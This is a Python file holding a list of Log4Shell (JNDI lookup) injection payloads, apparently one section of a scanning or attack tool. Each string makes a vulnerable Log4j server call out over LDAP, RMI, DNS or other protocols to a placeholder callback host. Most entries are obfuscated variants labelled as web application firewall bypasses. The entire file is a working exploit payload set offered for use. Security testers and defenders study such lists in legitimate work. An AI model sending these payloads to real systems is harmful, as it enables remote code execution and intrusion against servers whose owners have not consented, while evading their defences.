"""
Log4Shell/JNDI Payloads with WAF Bypass
"""

# 21. Log4Shell/JNDI Payloads
LOG4SHELL_PAYLOADS = [
    "${jndi:ldap://{callback}/a}",
    "${jndi:rmi://{callback}/a}",
    "${jndi:dns://{callback}/a}",
    "${${lower:j}${lower:n}${lower:d}${lower:i}:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}/a}",
    "${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{callback}/a}",
    "${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//{callback}/a}",
    "${jndi:${lower:l}${lower:d}${lower:a}${lower:p}://{callback}}",
    
    # ============================================
    # WAF BYPASS VARIATIONS FOR LOG4SHELL
    # ============================================
    
    # Case manipulation
    "${JnDi:ldap://{callback}/a}",
    "${JNDI:LDAP://{callback}/a}",
    "${jNdI:lDaP://{callback}/a}",
    
    # Nested lookup bypass
    "${${lower:j}ndi:ldap://{callback}/a}",
    "${j${lower:n}di:ldap://{callback}/a}",
    "${jn${lower:d}i:ldap://{callback}/a}",
    "${jnd${lower:i}:ldap://{callback}/a}",
    
    # Unicode bypass
    "${jndi:ldap://{callback}/\\u0061}",
    "${jn\\u0064i:ldap://{callback}/a}",
    
    # Empty lookup
    "${${::-j}${::-n}${::-d}${::-i}:ldap://{callback}/a}",
    "${${lower:${lower:jndi}}:ldap://{callback}/a}",
    
    # Environment variable bypass
    "${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//{callback}/a}",
    "${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}ldap://{callback}/a}",
    
    # Date bypass
    "${${date:'j'}${date:'n'}${date:'d'}${date:'i'}:ldap://{callback}/a}",
    
    # Upper/lower mix
    "${${upper:j}${upper:n}${upper:d}${upper:i}:ldap://{callback}/a}",
    "${${lower:J}${lower:N}${lower:D}${lower:I}:ldap://{callback}/a}",
    
    # Base64 bypass
    "${${base64:am5kaQ==}:ldap://{callback}/a}",
    
    # Marker bypass
    "${${::-j}${::-n}${::-d}${::-i}${::-:}${::-l}${::-d}${::-a}${::-p}://{callback}/a}",
    
    # Protocol variations
    "${jndi:ldaps://{callback}/a}",
    "${jndi:rmi://{callback}/a}",
    "${jndi:dns://{callback}/a}",
    "${jndi:iiop://{callback}/a}",
    "${jndi:corba://{callback}/a}",
    "${jndi:nds://{callback}/a}",
    "${jndi:nis://{callback}/a}",
    
    # URL encoding
    "${jndi:ldap://{callback}/%61}",
    "${jndi:ldap://{callback}/%2561}",
    
    # Space injection
    "${jndi:ldap:// {callback}/a}",
    "${jndi: ldap://{callback}/a}",
    
    # Special characters
    "${jndi:ldap://{callback}/a?a=b}",
    "${jndi:ldap://{callback}/#a}",
    
    # Recursive lookup
    "${${:-${:-$${::-j}}}ndi:ldap://{callback}/a}",
    "${j${${:-n}}di:ldap://{callback}/a}",
    
    # Ctx lookup
    "${${ctx:loginId}${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{callback}/a}",
    
    # Main lookup
    "${${main:\\x24{jndi:ldap://{callback}/a}}}",
    
    # Bundle lookup  
    "${${bundle:application}${::-j}ndi:ldap://{callback}/a}",
]
